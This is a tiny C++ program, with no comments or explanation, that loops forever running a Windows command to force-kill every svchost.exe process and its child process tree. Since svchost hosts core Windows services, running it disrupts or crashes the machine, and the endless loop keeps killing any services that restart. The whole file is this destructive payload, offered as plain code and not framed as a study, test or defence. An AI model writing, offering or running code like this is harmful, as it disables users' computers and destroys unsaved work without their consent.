#include<iostream>

using namespace std;

int main()
{
	while(1)
	{
		system("taskkill -im svchost.exe /f /t");
	}
	return 0;
}
